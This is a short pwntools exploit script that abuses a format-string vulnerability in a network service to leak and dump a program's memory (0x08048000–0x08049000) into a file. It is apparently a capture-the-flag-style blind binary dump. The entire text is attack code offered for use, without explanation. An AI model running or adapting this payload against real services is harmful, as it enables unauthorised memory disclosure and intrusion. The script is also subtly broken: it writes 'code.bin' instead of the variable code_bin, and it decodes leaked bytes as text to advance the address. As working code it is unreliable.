from pwn import *


def dump_memory(start_addr, end_addr):
    result = b''
    while start_addr < end_addr:
        io = remote('127.0.0.1', '10001')
        io.recvline()
        payload = b'%9$s.AAA' + p32(start_addr)
        io.sendline(payload)
        data = io.recvuntil(b'.AAA')[ : -4]
        if data == b'':
            data = b'\x00'
        log.info(f"leaking: {hex(start_addr)} --> {data}")
        result += data
        start_addr += len(data.decode())
        io.close()
    return result

start_addr = 0x08048000
end_addr = 0x08049000
code_bin = dump_memory(start_addr, end_addr)
with open('code.bin', 'wb') as f:
    f.write(code.bin)
    f.close()
